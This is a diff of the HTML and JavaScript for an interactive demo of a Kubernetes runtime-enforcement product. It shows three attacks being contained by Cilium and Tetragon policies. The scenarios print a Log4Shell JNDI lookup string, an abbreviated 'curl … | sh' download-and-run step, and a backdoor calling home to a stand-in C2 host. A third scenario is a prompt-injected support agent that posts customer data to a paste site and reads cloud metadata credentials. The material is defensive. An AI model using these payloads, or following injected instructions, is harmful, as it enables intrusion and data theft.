@@ -229,7 +229,7 @@ body,.app{font-feature-settings:'cv11','ss01','tnum'}
   <section class="cover" id="cover">
     <div class="k">Safety Layer · the decision layer for runtime enforcement</div>
     <h1>Something will get in. We decide what it can do.</h1>
-    <p class="msg">A bug, a poisoned package, a hijacked agent. Every cluster has the engines to limit them. <b>Nobody can safely decide the rules.</b> We decide them from evidence, and prove they won't break production.</p>
+    <p class="msg">A bug, a poisoned package, a hijacked agent. Every cluster already runs the engines to contain them. <b>Nobody can safely decide the rules.</b> We decide them from evidence and prove they won’t break production.</p>
     <div class="mini"><svg id="coverMap" viewBox="0 0 360 290" preserveAspectRatio="xMidYMid meet"></svg></div>
     <div class="btns"><button id="watch">Watch the story<small>about 2 minutes · plays by itself</small></button><button class="sec" id="explore">Explore step by step<small>at your pace · open the evidence</small></button></div>
     <div class="foot">Kubernetes · eBPF (Cilium, Tetragon) · lab data from a real namespace</div>
@@ -273,110 +273,110 @@ const BOUT={att:[40,40,'internet','','net','att'],api:[320,40,'K8s API','','api'
   py:[182,246,'payment','','app',''],ck:[322,118,'checkout','','app',''],ct:[322,196,'cart','','app',''],rd:[268,246,'redis-cart','','db','']};
 const C1='M40 150 Q182 30 322 118', C2='M40 150 Q130 240 322 196';
 const SCN={
- bug:{id:'bug',way:'A bug',wl:'adservice',ns:'boutique',core:'java',coreS:'java',lab:true,allow:1,
+ bug:{id:'bug',way:'A bug',short:'the bug',inside:'Same code, Log4Shell still inside.',wl:'adservice',ns:'boutique',core:'java',coreS:'java',lab:true,allow:1,
   AN:{att:[52,48,'attacker','internet','skull','att'],api:[308,48,'K8s API','','api',''],fe:[46,170,'frontend','','app',''],rd:[314,196,'redis-cart','customer carts','db','']},
   procs:['sh','curl','root'],
-  chain:[['fe','core','run','r','Request arrives with <b>${jndi:ldap://attacker/x}</b> in a header','frontend → adservice:9555 is a path it really needs.'],
-   ['core','att','atk','a','Log4j calls <b>ldap://attacker:1389</b> and loads the attacker’s class','Remote code is now running inside adservice.','Cilium','adservice egress: kube-dns:53 only → DROP. The call never connects, so no attacker class is loaded.'],
-   ['core','#curl','','a','The attacker’s code runs <b>sh -c "curl … | sh"</b>','More tools are downloaded and started.','Tetragon','exec allow-list for adservice: 8 programs. sh -c curl is not one → blocked.'],
-   ['core','api','atk','a','It calls the <b>K8s API</b> with the pod’s service-account token','Read secrets, start new pods.','Cilium','kube-apiserver not in adservice egress → DROP.'],
-   ['core','rd','atk','a','It connects to <b>redis-cart:6379</b>','Every customer’s cart.','Cilium','redis-cart not in adservice egress → DROP.'],
-   ['core','#root','','a','It tries to become <b>root</b>','setuid, new capabilities.','securityContext','allowPrivilegeEscalation: false · capabilities: drop ALL.']],
+  chain:[['fe','core','run','r','A request arrives with <b>${jndi:ldap://attacker/x}</b> in a header','frontend → adservice:9555 is a path the app genuinely needs.'],
+   ['core','att','atk','a','Log4j calls <b>ldap://attacker:1389</b> and loads the attacker’s class','The attacker’s code now runs inside adservice.','Cilium','adservice egress: kube-dns:53 only → DROP. The call never connects, so no attacker class is loaded.'],
+   ['core','#curl','','a','The attacker’s code runs <b>sh -c "curl … | sh"</b>','It downloads and starts more tools.','Tetragon','exec allow-list for adservice: 8 programs. sh -c curl isn’t one of them → blocked.'],
+   ['core','api','atk','a','It calls the <b>K8s API</b> with the pod’s service-account token','It can read secrets and start new pods.','Cilium','kube-apiserver not in adservice egress → DROP.'],
+   ['core','rd','atk','a','It connects to <b>redis-cart:6379</b>','Every customer’s cart is exposed.','Cilium','redis-cart not in adservice egress → DROP.'],
+   ['core','#root','','a','It tries to become <b>root</b>','Through setuid or new capabilities.','securityContext','allowPrivilegeEscalation: false · capabilities: drop ALL.']],
   ba:[['Ingress','any pod','frontend only','lab'],['K8s API','reachable','no path','lab'],['Internet','anywhere','none','lab'],['East-west','11 workloads','kube-dns only','lab'],['Programs','any binary','8 programs','lab'],['Privileges','14 capabilities','0','lab'],['Files','write anywhere','own paths','design']],
-  recap:['Manifests, <b>33,411</b> real flows, the programs it starts.','<b>sh → 203.0.113.7</b>, seen once while learning, kept out.','All 33,411 flows replayed against the policy: <b>PASS</b>.','4 stages, each approved, <b>0 needed flows dropped</b>.'],
-  breachT:'One bug, full breach.', breachP:'adservice is a Java service in boutique, a 12-service shop in our lab. It has <b>Log4Shell</b>.', startL:'Start the attack',
+  recap:['Manifests, <b>33,411</b> real flows and the programs it starts.','<b>sh → 203.0.113.7</b>, seen once during learning: <b>kept out</b>.','All 33,411 flows replayed against the policy: <b>PASS</b>.','Four stages, each approved; <b>0 needed flows dropped</b>.'],
+  breachT:'One bug, full breach.', breachP:'adservice is a Java service in boutique, a 12-service online shop running in our lab. It carries <b>Log4Shell</b>.', startL:'Start the attack',
   breachEnd:'<b>The bug is not the problem. The problem is that everything is allowed.</b>',
   why:'Log4Shell (CVE-2021-44228) hit almost every Java shop. The exploit needs one outbound connection to the attacker: the kind of path least privilege removes.',
   againP:'The same Log4Shell request. The bug is still in the code.', againEnd:'No attacker code ever runs.',
   BN:BOUT, NEED:[['fe','core'],['core','dns'],['fe','ck',C1],['fe','ct',C2],['ck','py','M322 118 Q300 230 182 246'],['ck','ct'],['ct','rd']], EXC:['att','api','ck','ct','rd','py'],
-  ev:[['Git','what the app declares','frontend’s manifest declares <b>AD_SERVICE_ADDR = adservice:9555</b>.'],['Hubble','what really connects','<b>33,411</b> real connections recorded. frontend → adservice seen 144 times.'],['Tetragon','what really runs','The programs adservice really starts: <b>java</b>, plus 6 from its startup script.'],['K8s API','what the platform needs','Every pod resolves <b>DNS</b>; the kubelet probes it.']],
+  ev:[['Git','what the app declares','frontend’s manifest declares <b>AD_SERVICE_ADDR = adservice:9555</b>.'],['Hubble','what really connects','<b>33,411</b> real connections recorded, including frontend → adservice 144 times.'],['Tetragon','what really runs','adservice starts <b>java</b>, plus 6 programs from its startup script.'],['K8s API','what the platform needs','Every pod needs <b>DNS</b>, and the kubelet runs health probes.']],
   evDet:`<h4>Git · Deployment frontend</h4><pre>env:\n  - name: AD_SERVICE_ADDR\n    value: adservice:9555</pre><h4>Hubble · flows</h4><pre>frontend → adservice:9555  TCP  FORWARDED\n… 143 more in 33,411 recorded flows</pre><h4>Tetragon · process_exec</h4><pre>binary  /opt/java/openjdk/bin/java\nparent  AdService (entrypoint script)</pre><h4>K8s API · platform</h4><pre>every pod → kube-dns:53 UDP\nkubelet → adservice:9555 (health probe)</pre>`,
-  dec:[['a','116 EXCESS','Allowed today, <b>never declared, never used</b>. Will be closed.'],['al','17 NEEDED','Declared or seen, and makes sense. Stays open.'],['ask','6 ASK','Programs from the startup script. <b>A person confirms.</b>'],['a','KEPT OUT','<b>sh → 203.0.113.7</b>, seen once while learning. Not the app’s binary, no manifest, no DNS name. <b>Never learned.</b>']],
+  dec:[['a','116 EXCESS','Allowed today, but <b>never declared and never used</b>. To be closed.'],['al','17 NEEDED','Declared or observed, and consistent with the app. Stays open.'],['ask','6 ASK','Programs started by the startup script. <b>A person confirms them.</b>'],['a','KEPT OUT','<b>sh → 203.0.113.7</b>, seen once during learning. Not the app’s binary, not in any manifest, no DNS name. <b>Never becomes a rule.</b>']],
   decChips:[['java ✓','ok'],['+6 ?','ask'],['sh','a']], kept:'sh → 203.0.113.7',
   decDet:`<h4>adservice · paths</h4><table><tr><td>IN frontend :9555</td><td class="g">CONFIRMED · manifest + 144 flows</td></tr><tr><td>IN kubelet :9555</td><td class="g">NEEDED · platform</td></tr><tr><td>OUT kube-dns :53</td><td class="g">NEEDED · platform</td></tr><tr><td>OUT 11 workloads</td><td class="x">EXCESS · 0 flows, not declared</td></tr><tr><td>IN 10 workloads</td><td class="x">EXCESS · 0 flows, not declared</td></tr></table><h4>adservice · programs</h4><table><tr><td>AdService, /bin/sh</td><td class="g">declared in the image</td></tr><tr><td>java, sed, uname, tr, xargs, echo</td><td class="y">started by the script · a person confirms</td></tr></table><h4>Kept out</h4><pre>/bin/sh → 203.0.113.7:443  seen 1×\nnot the app binary · no manifest · no DNS name\n→ flagged, never allowed</pre>`,
   LN:{att:[40,36,'internet','','net','att'],api:[320,36,'K8s API','','api',''],fe:[40,150,'frontend','','app',''],ct:[40,254,'checkout','','app',''],rd:[320,150,'redis-cart','','db',''],dns:[320,254,'kube-dns','','app','']},
   rows:[['exec',4,[['java ✓','ok'],['sh','b'],['curl','b']]],['priv',5,[['root','b'],['setuid','b'],['caps 0','ok']]],['files',6,[['/app r','ok'],['token','b'],['/etc w','b']]]],
-  layers:[['Ingress','who may call it','Cilium','Only <b>frontend → :9555</b>, plus the kubelet health probe. A compromised checkout or cart can’t reach it. <b class="ok">Stops lateral movement in.</b>','','lab'],
-   ['K8s API','its own credentials','Cilium','No path to <b>kube-apiserver</b>. adservice never talks to it.','4','lab'],
+  layers:[['Ingress','who may call it','Cilium','Only <b>frontend → :9555</b>, plus the kubelet health probe. A compromised checkout or cart can’t reach it. <b class="ok">Stops lateral movement.</b>','','lab'],
+   ['K8s API','its own credentials','Cilium','No path to <b>kube-apiserver</b>. adservice never needs it.','4','lab'],
    ['Internet','outbound to the world','Cilium','<b>No internet egress.</b> Nothing in the evidence ever left the cluster.','2','lab'],
-   ['East-west','other pods','Cilium','Out only to <b>kube-dns:53</b>. redis-cart and 10 others closed.','5','lab'],
-   ['Programs','what may start','Tetragon','<b>8 programs</b> seen at startup. sh -c curl, wget, nc: blocked.','3','lab'],
+   ['East-west','other pods','Cilium','Outbound to <b>kube-dns:53</b> only. redis-cart and 10 other workloads: closed.','5','lab'],
+   ['Programs','what may start','Tetragon','The <b>8 programs</b> seen at startup. Anything else (curl, wget, nc) is blocked.','3','lab'],
    ['Privileges','root, capabilities','securityContext','<b>allowPrivilegeEscalation: false</b>, capabilities drop ALL.','6','lab'],
    ['Files','what it reads and writes','Tetragon','Reads <b>/app</b> only. No reads of the service-account token, no writes to /etc.','4','next']],
-  layEnd:'<b>7 layers × 12 workloads = 84 decisions</b> in one small namespace. In the lab today: 6 of 7.',
-  replay:'Replaying <b>33,411</b> recorded connections against the new policy…', pass:'The 116 paths it closes carried no traffic at all.', missL:'frontend', fail:'frontend → adservice would drop: 144 real requests fail.',
+  layEnd:'<b>7 layers × 12 workloads = 84 decisions</b> in one small namespace. In the lab today: 6 of 7 layers.',
+  replay:'Replaying <b>33,411</b> recorded connections against the new policy…', pass:'The 116 paths it closes carried no traffic at all.', missL:'frontend', fail:'frontend → adservice would drop: 144 real requests would fail.',
   proveDet:`<h4>decision-layer verify adservice --replay</h4><pre>replaying 33,411 Hubble flows\n\nfrontend → adservice:9555   kept ×144\nkubelet  → adservice:9555   kept ×583\nguard: kube-dns:53          kept\nunused paths                21 closed\n\nRESULT  PASS</pre><h4>Same check for programs</h4><pre>exec replay: every program seen at startup\nis on the allow-list → the container still starts</pre>`,
   prog:[['java ✓','ok'],['sh','b'],['curl','b']],
   enfDet:`<h4>Stage 3 · CiliumNetworkPolicy (generated)</h4><pre>kind: CiliumNetworkPolicy\nspec:\n  endpointSelector: {matchLabels: {app: adservice}}\n  ingress:\n  - fromEndpoints: [{matchLabels: {app: frontend}}]\n    toPorts: [{ports: [{port: "9555"}]}]\n  egress:\n  - toEndpoints: [{matchLabels: {k8s-app: kube-dns}}]\n    toPorts: [{ports: [{port: "53", protocol: UDP}]}]</pre><h4>Stage 4 · Tetragon + securityContext</h4><pre>exec allow-list: 8 programs (Tetragon)\nallowPrivilegeEscalation: false\ncapabilities: drop [ALL]</pre><h4>Rollback</h4><p>Each stage is its own policy set. A drop on a required flow rolls it back automatically.</p>` },
 
- pkg:{id:'pkg',way:'A poisoned package',wl:'recommendation',ns:'boutique',core:'python',coreS:'py',lab:false,allow:1,
+ pkg:{id:'pkg',way:'A poisoned package',short:'the package',inside:'Same code, backdoor still inside.',wl:'recommendation',ns:'boutique',core:'python',coreS:'py',lab:false,allow:1,
   AN:{att:[52,48,'c2 server','internet','skull','att'],api:[308,48,'K8s API','','api',''],fe:[46,170,'registry','new release','pkg',''],rd:[314,196,'redis-cart','customer carts','db','']},
   procs:['sh','curl','root'],
   chain:[['fe','core','run','r','A routine release pulls a <b>poisoned dependency</b>','It passed review: the backdoor hides inside a trusted library update.'],
    ['core','att','atk','a','On import, it calls home to <b>c2.example:443</b>','The attacker now controls code inside recommendation.','Cilium','recommendation egress: productcatalog:3550 + kube-dns:53 only → DROP. The backdoor never gets its orders.'],
-   ['core','#sh','','a','It starts <b>/bin/sh</b> to run the attacker’s commands','A Python service never needs a shell.','Tetragon','exec allow-list for recommendation: python only → blocked.'],
-   ['core','api','atk','a','It calls the <b>K8s API</b> with the pod’s token','Read secrets, start new pods.','Cilium','kube-apiserver not in its egress → DROP.'],
-   ['core','rd','atk','a','It connects to <b>redis-cart:6379</b>','Every customer’s cart.','Cilium','redis-cart not in its egress → DROP.'],
-   ['core','#root','','a','It tries to become <b>root</b> to stay','setuid, new capabilities.','securityContext','allowPrivilegeEscalation: false · capabilities: drop ALL.']],
+   ['core','#sh','','a','It starts <b>/bin/sh</b> to run the attacker’s commands','This Python service never needs a shell.','Tetragon','exec allow-list for recommendation: python only → blocked.'],
+   ['core','api','atk','a','It calls the <b>K8s API</b> with the pod’s token','It can read secrets and start new pods.','Cilium','kube-apiserver not in its egress → DROP.'],
+   ['core','rd','atk','a','It connects to <b>redis-cart:6379</b>','Every customer’s cart is exposed.','Cilium','redis-cart not in its egress → DROP.'],
+   ['core','#root','','a','It tries to become <b>root</b> to persist','Through setuid or new capabilities.','securityContext','allowPrivilegeEscalation: false · capabilities: drop ALL.']],
   ba:[['Ingress','any pod','frontend only'],['K8s API','reachable','no path'],['Internet','anywhere','none'],['East-west','every pod','catalog + DNS'],['Programs','any binary','python only'],['Privileges','root possible','none'],['Files','write anywhere','/app read','design']],
-  recap:['frontend and catalog in its manifests, a week of flows, one program: <b>python</b>.','The backdoor’s call home was <b>already running while learning</b>. Not declared, not a cluster service: <b>kept out</b>.','Its recorded traffic replayed: <b>PASS</b>. Product pages still get recommendations.','The same 4 stages. <b>The backdoor is still inside, with nowhere to go.</b>'],
-  breachT:'One package, full breach.', breachP:'recommendation is a Python service in the same shop. A new release pulls a dependency with a <b>backdoor</b>, like xz in 2024.', startL:'Ship the release',
+  recap:['Manifests naming frontend and productcatalog, a week of flows, one program: <b>python</b>.','The backdoor’s call home was <b>already running during learning</b>. Not declared, not a cluster service: <b>kept out</b>.','Its recorded traffic replayed: <b>PASS</b>. Product pages still get recommendations.','The same 4 stages. <b>The backdoor is still inside, with nowhere to go.</b>'],
+  breachT:'One package, full breach.', breachP:'recommendation is a Python service in the same shop. A new release pulls in a dependency with a <b>backdoor</b>, as xz did in 2024.', startL:'Ship the release',
   breachEnd:'<b>Nobody wrote a bug. Trusted code did what it was allowed to do.</b>',
-  why:'The xz backdoor (CVE-2024-3094) was hidden for two years in a trusted library. Scanners look for known bad versions; a new backdoor isn’t known yet. What it does at runtime still needs a path out.',
+  why:'The xz backdoor (CVE-2024-3094) was planted in a trusted library by a maintainer who spent two years earning trust. Scanners look for known bad versions; a new backdoor isn’t known yet. Whatever it does at runtime still needs a path out.',
   againP:'The same poisoned release. The backdoor is still in the code.', againEnd:'The backdoor never gets its orders.',
   BN:{...BOUT,py:[182,246,'catalog','','app','']}, NEED:[['fe','core'],['core','dns'],['core','py'],['fe','ck',C1],['fe','ct',C2],['ck','ct'],['ct','rd']], EXC:['att','api','ck','ct','rd'],
-  ev:[['Git','what the app declares','frontend declares <b>RECOMMENDATION_SERVICE_ADDR</b>; recommendation declares <b>PRODUCT_CATALOG_SERVICE_ADDR</b>.'],['Hubble','what really connects','frontend → recommendation and recommendation → productcatalog, on every product page.'],['Tetragon','what really runs','One program: <b>python</b>. Nothing else ever starts.'],['K8s API','what the platform needs','Every pod resolves <b>DNS</b>; the kubelet probes it.']],
+  ev:[['Git','what the app declares','frontend declares <b>RECOMMENDATION_SERVICE_ADDR</b>; recommendation declares <b>PRODUCT_CATALOG_SERVICE_ADDR</b>.'],['Hubble','what really connects','frontend → recommendation and recommendation → productcatalog, on every product page.'],['Tetragon','what really runs','One program: <b>python</b>. Nothing else ever starts.'],['K8s API','what the platform needs','Every pod needs <b>DNS</b>, and the kubelet runs health probes.']],
   evDet:`<h4>Git · Deployment recommendation</h4><pre>env:\n  - name: PRODUCT_CATALOG_SERVICE_ADDR\n    value: productcatalogservice:3550</pre><h4>Hubble · flows</h4><pre>frontend → recommendation:8080       FORWARDED\nrecommendation → productcatalog:3550 FORWARDED</pre><h4>Tetragon · process_exec</h4><pre>binary  /usr/local/bin/python</pre><p>Illustration: same sources and checks as the lab run on adservice.</p>`,
-  dec:[['a','EXCESS','Allowed today, <b>never declared, never used</b>. Will be closed.'],['al','NEEDED','frontend in, <b>productcatalog</b> out, DNS. Stays open.'],['a','KEPT OUT','<b>python → c2.example:443</b>, seen while learning: the backdoor was already running. No manifest, not a cluster service. <b>Never learned.</b>']],
+  dec:[['a','EXCESS','Allowed today, but <b>never declared and never used</b>. To be closed.'],['al','NEEDED','Inbound from frontend, outbound to <b>productcatalog</b> and DNS. Stays open.'],['a','KEPT OUT','<b>python → c2.example:443</b>, seen during learning because the backdoor was already running. Not in any manifest, not a cluster service. <b>Never becomes a rule.</b>']],
   decChips:[['python ✓','ok'],['c2 ✕','a']], kept:'python → c2.example',
-  decDet:`<h4>Why “learning mode” is not enough</h4><p>The backdoor was in the image before learning started. A tool that records traffic and allows it would have learned the call home as normal. Here it fails every check: not declared in any manifest, not a service in the cluster, no reason in the code’s config.</p><pre>python → c2.example:443  seen during learning\nnot declared · not in cluster · no config\n→ flagged, never allowed</pre>`,
+  decDet:`<h4>Why “learning mode” is not enough</h4><p>The backdoor was in the image before learning started. A tool that simply records traffic and allows it would have learned the call home as normal behavior. Here it fails every check: it isn’t declared in any manifest, isn’t a service in the cluster, and nothing in the app’s config explains it.</p><pre>python → c2.example:443  seen during learning\nnot declared · not in cluster · no config\n→ flagged, never allowed</pre>`,
   LN:{att:[40,36,'c2 server','','net','att'],api:[320,36,'K8s API','','api',''],fe:[40,150,'frontend','','app',''],ct:[40,254,'checkout','','app',''],rd:[320,150,'redis-cart','','db',''],dns:[320,254,'catalog','','app','']},
   rows:[['exec',4,[['python','ok'],['sh','b'],['curl','b']]],['priv',5,[['root','b'],['setuid','b'],['caps 0','ok']]],['files',6,[['/app r','ok'],['token','b'],['/etc w','b']]]],
-  layers:[['Ingress','who may call it','Cilium','Only <b>frontend → :8080</b>. A compromised neighbor can’t reach it. <b class="ok">Stops lateral movement in.</b>','','eng'],
-   ['K8s API','its own credentials','Cilium','No path to <b>kube-apiserver</b>.','4','eng'],
+  layers:[['Ingress','who may call it','Cilium','Only <b>frontend → :8080</b>. A compromised neighbor can’t reach it. <b class="ok">Stops lateral movement.</b>','','eng'],
+   ['K8s API','its own credentials','Cilium','No path to <b>kube-apiserver</b>. The service never needs it.','4','eng'],
    ['Internet','outbound to the world','Cilium','<b>No internet egress.</b> The backdoor can’t call home.','2','eng'],
-   ['East-west','other pods','Cilium','Out only to <b>productcatalog:3550</b> and DNS.','5','eng'],
-   ['Programs','what may start','Tetragon','<b>python</b> only. A shell never starts.','3','eng'],
+   ['East-west','other pods','Cilium','Outbound to <b>productcatalog:3550</b> and DNS only.','5','eng'],
+   ['Programs','what may start','Tetragon','<b>python</b> only. No shell can start.','3','eng'],
    ['Privileges','root, capabilities','securityContext','<b>allowPrivilegeEscalation: false</b>, capabilities drop ALL.','6','eng'],
    ['Files','what it reads and writes','Tetragon','Reads <b>/app</b> only. No token reads, no writes to /etc.','4','next']],
-  layEnd:'Same seven layers, same engines as the lab. <b>The backdoor is still inside. It just can’t do anything.</b>',
+  layEnd:'The same seven layers and engines as the lab. <b>The backdoor is still inside; it just can’t do anything.</b>',
   replay:'Replaying a week of recorded connections against the new policy…', pass:'Every path it closes carried no needed traffic.', missL:'frontend', fail:'frontend → recommendation would drop: product pages lose recommendations.',
   proveDet:`<h4>verify recommendation --replay</h4><pre>frontend → recommendation:8080       kept\nrecommendation → productcatalog:3550 kept\nguard: kube-dns:53                   kept\npython → c2.example:443              DROP (kept out)\n\nRESULT  PASS</pre>`,
   prog:[['python ✓','ok'],['sh','b'],['curl','b']],
   enfDet:`<h4>Generated the same way as the lab policy</h4><pre>endpointSelector: {app: recommendation}\ningress:  frontend :8080\negress:   productcatalog :3550, kube-dns :53\nexec:     python only (Tetragon)</pre>` },
 
- agt:{id:'agt',way:'A hijacked agent',wl:'support-agent',ns:'support',core:'python',coreS:'py',lab:false,allow:2,
+ agt:{id:'agt',way:'A hijacked agent',short:'the agent',inside:'Same model, still fooled by the ticket.',wl:'support-agent',ns:'support',core:'python',coreS:'py',lab:false,allow:2,
   AN:{att:[52,48,'paste site','internet','net',''],api:[308,48,'metadata','cloud credentials','api',''],fe:[46,170,'ticket','MCP tool','doc',''],rd:[314,170,'LLM API','in its profile','ai','okn']},
   procs:['sh','curl'],
   chain:[['fe','core','run','r','The agent reads a ticket with <b>hidden instructions</b>','Reading tickets is its job.'],
    ['core','rd','alw','al','The model decides to follow them','The LLM API is in its profile, so the call is allowed. Judging content is the gateway’s job, not the kernel’s.'],
    ['core','att','atk','a','It posts customer data to a <b>paste site</b>','paste.example.net:443','Cilium','egress: llm-gateway + mcp-tickets + kb only → DROP.'],
-   ['core','#curl','','a','Its shell tool runs <b>curl … | sh</b>','Downloads and runs a script.','Tetragon','exec allow-list: python only → blocked.'],
+   ['core','#curl','','a','Its shell tool runs <b>curl … | sh</b>','It downloads and runs a script.','Tetragon','exec allow-list: python only → blocked.'],
    ['core','api','atk','a','It reads <b>cloud credentials</b> from the metadata service','169.254.169.254','Cilium','169.254.169.254 not in its egress → DROP.']],
   ba:[['Ingress','any pod','support UI only'],['K8s API','reachable','no path'],['Internet','anywhere','llm-gateway only'],['East-west','every pod + metadata','mcp-tickets, kb'],['Programs','any (shell tool)','python only'],['Privileges','root possible','none'],['Files','cloud credentials','none','design']],
   recap:['Its <b>config</b> (model, MCP tools, kb), a week of traffic, python only.','Shell tool <b>declared, never used</b>: tightened. Undeclared hosts: <b>kept out</b>.','Its real tool calls replayed: <b>PASS</b>. It still answers tickets.','The same 4 stages, the same engines. <b>Its profile comes from its config.</b>'],
-  breachT:'One ticket, full breach.', breachP:'support-agent is an AI agent with a model API, a ticket tool (MCP) and a shell tool. A customer ticket hides instructions.', startL:'Send the ticket',
+  breachT:'One ticket, full breach.', breachP:'support-agent is an AI agent with a model API, a ticket tool (MCP) and a shell tool. A customer ticket contains hidden instructions.', startL:'Send the ticket',
   breachEnd:'<b>The model was fooled. With default-allow, everything it tried worked.</b>',
-  why:'Prompt injection can’t be fully prevented inside the model. The agent acts with real credentials and real network access, so the damage is decided by what its pod is allowed to do.',
+  why:'Prompt injection can’t be fully prevented inside the model. The agent acts with real credentials and real network access, so what its pod is allowed to do decides the damage.',
   againP:'The same ticket. The model is still fooled.', againEnd:'The model was fooled. <b>Nothing it tried left the pod.</b>',
   BN:{att:[40,40,'internet','','net','att'],api:[320,40,'K8s API','','api',''],fe:[40,150,'mcp-tickets','','doc',''],dns:[74,246,'kube-dns','','app',''],py:[182,246,'llm-gateway','','ai',''],ck:[322,118,'kb','','db',''],ct:[322,196,'crm','','app',''],rd:[268,246,'metadata','','api','']},
   NEED:[['core','fe'],['core','dns'],['core','py'],['core','ck'],['fe','ct',C2]], EXC:['att','api','ct','rd'],
-  ev:[['Config','what the agent declares','Its config lists <b>llm-gateway</b>, <b>mcp-tickets</b> and <b>kb</b>, plus a shell tool.'],['Hubble','what really connects','A week of traffic: only those three, plus DNS.'],['Tetragon','what really runs','<b>python</b> only. The shell tool was never used.'],['K8s API','what the platform needs','DNS. It never calls the K8s API.']],
+  ev:[['Config','what the agent declares','Its config lists <b>llm-gateway</b>, <b>mcp-tickets</b> and <b>kb</b>, plus a shell tool.'],['Hubble','what really connects','A week of traffic: only those three, plus DNS.'],['Tetragon','what really runs','<b>python</b> only. The shell tool was never used.'],['K8s API','what the platform needs','DNS only. It never calls the K8s API.']],
   evDet:`<h4>Agent profile, from its config (design)</h4><table><tr><td>model API</td><td class="g">declared + seen · allow</td></tr><tr><td>mcp-tickets:8080</td><td class="g">declared + seen · allow</td></tr><tr><td>kb</td><td class="g">declared + seen · allow</td></tr><tr><td>shell tool</td><td class="y">declared, never used · tighten</td></tr><tr><td>paste.example.net</td><td class="x">never declared · a person decides</td></tr></table>`,
-  dec:[['a','EXCESS','Allowed today, <b>never declared, never used</b>. Will be closed.'],['al','NEEDED','<b>llm-gateway, mcp-tickets, kb</b>: declared and seen. Stay open.'],['ask','TIGHTEN','The shell tool: declared, <b>never used</b>. A person decides to remove it.'],['a','KEPT OUT','<b>Any host it never declared</b>, like paste.example.net. A person decides, not a default.']],
+  dec:[['a','EXCESS','Allowed today, but <b>never declared and never used</b>. To be closed.'],['al','NEEDED','<b>llm-gateway, mcp-tickets, kb</b>: declared and seen. Stay open.'],['ask','TIGHTEN','The shell tool is declared but <b>never used</b>. A person approves removing it.'],['a','KEPT OUT','<b>Any host it never declared</b>, such as paste.example.net. Opening one is a person’s decision, never a default.']],
   decChips:[['python ✓','ok'],['sh ?','ask']], kept:'any undeclared host',
   decDet:`<h4>The honest limit</h4><p>Misuse through an allowed path (data inside a call to its own model API) is content. The gateway and guardrails catch that; the kernel catches actions.</p><h4>Real cases</h4><p><a href="https://cohere.com/blog/concerning-behaviour-popular-open-weight-ai-model" target="_blank" rel="noopener">Cohere: a model goes off-task ↗</a><br><a href="https://jfrog.com/blog/data-scientists-targeted-by-malicious-hugging-face-ml-models-with-silent-backdoor/" target="_blank" rel="noopener">JFrog: poisoned models on Hugging Face ↗</a></p>`,
   LN:{att:[40,36,'paste site','','net','att'],api:[320,36,'K8s API','','api',''],fe:[40,150,'support UI','','app',''],ct:[40,254,'other pods','','app',''],rd:[320,150,'metadata','','api',''],dns:[320,254,'llm-gateway','','ai','']},
   rows:[['exec',4,[['python','ok'],['sh','b'],['curl','b']]],['priv',5,[['root','b'],['setuid','b'],['caps 0','ok']]],['files',6,[['/app r','ok'],['token','b'],['~/.aws','b']]]],
-  layers:[['Ingress','who may call it','Cilium','Only the <b>support UI</b> may call it. <b class="ok">Stops lateral movement in.</b>','','eng'],
+  layers:[['Ingress','who may call it','Cilium','Only the <b>support UI</b> may call it. <b class="ok">Stops lateral movement.</b>','','eng'],
    ['K8s API','its own credentials','Cilium','No path to <b>kube-apiserver</b>. The agent never needs it.','','eng'],
-   ['Internet','outbound to the world','Cilium','Out only to <b>llm-gateway</b>. No paste sites, no unknown hosts.','3','eng'],
+   ['Internet','outbound to the world','Cilium','Outbound to <b>llm-gateway</b> only. No paste sites, no unknown hosts.','3','eng'],
    ['East-west','other pods','Cilium','Only <b>mcp-tickets</b>, <b>kb</b> and DNS. No <b>metadata</b> service.','5','eng'],
    ['Programs','what may start','Tetragon','<b>python</b> only. The shell tool can’t start curl or sh.','4','eng'],
    ['Privileges','root, capabilities','securityContext','<b>allowPrivilegeEscalation: false</b>, capabilities drop ALL.','','eng'],
-   ['Files','what it reads and writes','Tetragon','No cloud credential files, no token reads.','5','next']],
+   ['Files','what it reads and writes','Tetragon','No access to cloud credential files or the service-account token.','5','next']],
   layEnd:'An agent gets the same seven layers. <b>Its profile comes from its config, not from a guess.</b>',
-  replay:'Replaying a week of the agent’s real traffic against the new profile…', pass:'Every tool it really uses still works.', missL:'mcp-tickets', fail:'agent → mcp-tickets would drop: it can’t read tickets.',
+  replay:'Replaying a week of the agent’s real traffic against the new profile…', pass:'Every tool it actually uses still works.', missL:'mcp-tickets', fail:'agent → mcp-tickets would drop: it can’t read tickets.',
   proveDet:`<h4>verify support-agent --replay</h4><pre>agent → llm-gateway     kept\nagent → mcp-tickets     kept\nagent → kb              kept\nguard: kube-dns:53      kept\n\nRESULT  PASS</pre>`,
   prog:[['python ✓','ok'],['sh','b'],['curl','b']],
   enfDet:`<h4>Agent profile, enforced (design)</h4><pre>egress:  llm-gateway, mcp-tickets, kb, kube-dns\nexec:    python only (Tetragon)\nfiles:   no cloud credentials\nprivs:   no escalation, drop ALL</pre>` }
@@ -433,11 +433,11 @@ const seqLive=(L,s,cnt)=>{ const n=cnt!=null?cnt:s.n; if(n<1) return ''; const c
 const trackHTML=(L,s)=>L.map((st,i)=>{ const done=i<s.n; const blocked=s.enf&&st[3]==='a'&&st[6]; const c=!done?'':blocked?'b':st[3]==='r'?'r':st[3]==='al'?'al':'a'; return `<button data-k="${i}" class="${c} ${(s.sel!=null?s.sel:s.n-1)===i?'cur':''}" ${done?'':'disabled'}>${i+1}</button>`; }).join('');
 
 // ---------- the opening and the summary: three ways in
-const EN={bug:[46,62,'a bug','Log4Shell','app','att'],pkg:[180,34,'a package','xz backdoor','pkg','att'],agt:[314,62,'an agent','prompt injection','ai','att'],
+const EN={bug:[46,62,'bug','Log4Shell','app','att'],pkg:[180,34,'package','xz backdoor','pkg','att'],agt:[314,62,'agent','prompt injection','ai','att'],
           net:[50,252,'internet','','net',''],api:[180,262,'K8s API','','api',''],data:[310,252,'customer data','','db','']};
 const ENTRY=[['bug','A bug','in code you wrote or imported','<b>Log4Shell</b> (2021): one log line runs the attacker’s code. Almost every Java shop was exposed.'],
- ['pkg','A poisoned package','in code you trust','The <b>xz backdoor</b> (2024) shipped inside a trusted Linux library. Malicious npm and PyPI packages appear every week.'],
- ['agt','A hijacked agent','following someone else’s instructions','<b>Prompt injection</b>: a ticket, a web page or a tool result tells the agent what to do. It has your credentials.']];
+ ['pkg','A poisoned package','in code you trust','The <b>xz backdoor</b> (2024) was hidden inside a trusted Linux library. New malicious npm and PyPI packages appear every week.'],
